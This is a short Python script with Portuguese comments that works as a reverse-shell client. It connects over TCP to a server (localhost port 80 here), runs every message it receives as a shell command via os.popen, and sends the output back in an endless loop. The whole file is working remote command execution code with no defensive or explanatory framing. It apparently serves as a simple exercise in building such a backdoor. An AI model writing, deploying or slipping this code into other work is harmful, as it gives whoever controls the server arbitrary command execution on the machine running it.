import socket
import os

def main():
    #criando socket tcp
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #conectando na porta 80 em localhost
        client.connect(('localhost', 80))
    except:
        #sai do programa se não tiver conectado (quer dizer que a porta ou o host não esta aberta/existe)
        return print('\nNão foi possível conectar ao servidor.')

    print('\nConectado!')

    #recebe as mensagens do servidor
    receiveMessages(client)

#função que recebe as mensagens no servidor e executa no shell
def receiveMessages(client):
    #não perde a conexão
    while True:
        try:
            #recebe mensagen do servidor e salva na variavel msg
            msg = client.recv(2048).decode()

            #executa a mensagem recebida do servidor no shell e coloca o output na variavel response
            with os.popen(msg, "r") as response:
                #envia para o servidor o conteúdo guardado na variavel response
                client.send(response.read().strip().encode())    
            #continua o loop
        
        except Exception as ex:
            print(f'\n Não foi possível permanecer conectado no servidor por: {str(ex)}.\n')
            print('Pressione <Enter> para continuar...')
            client.close()
            break
main()